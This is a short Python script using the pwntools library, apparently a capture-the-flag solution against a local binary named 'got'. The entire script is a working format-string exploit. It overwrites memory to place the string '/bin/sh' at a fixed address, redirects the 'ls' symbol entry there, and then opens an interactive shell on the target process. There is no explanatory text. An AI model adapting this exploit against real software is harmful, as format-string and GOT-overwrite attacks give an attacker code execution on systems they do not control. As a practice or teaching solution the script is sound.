#! /usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./got')
p = process('./got')


writes = {0x404200: "/bin/sh", elf.symbols['ls']: 0x404200}
p.sendlineafter(b'Can you fight?\n',fmtstr_payload(6, writes))

p.interactive()